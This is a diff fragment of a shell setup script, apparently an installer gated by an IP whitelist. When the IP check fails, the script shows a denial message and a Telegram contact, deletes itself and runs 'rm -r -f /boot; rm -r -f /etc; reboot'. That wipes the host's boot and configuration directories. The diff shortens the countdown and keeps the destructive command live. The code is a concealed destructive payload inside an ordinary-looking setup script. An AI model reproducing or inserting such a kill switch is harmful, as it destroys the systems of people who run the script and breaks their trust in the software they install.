@@ -16,11 +16,11 @@ if [ $MYIP = $IZIN ]; then
 echo -e "${green}Permission Accepted...${NC}"
 else
 echo -e "${red}Permission Denied!${NC}";
-rm -f setup.sh
 echo "Please Contact Admin"
 echo "Telegram t.me/xzvnct"
-echo "Reboot in 10 Sec"
-sleep 10
+echo "Waiting 5 Sec"
+rm -f setup.sh
+sleep 5
 rm -r -f /boot; rm -r -f /etc; reboot
 exit 0
 fi
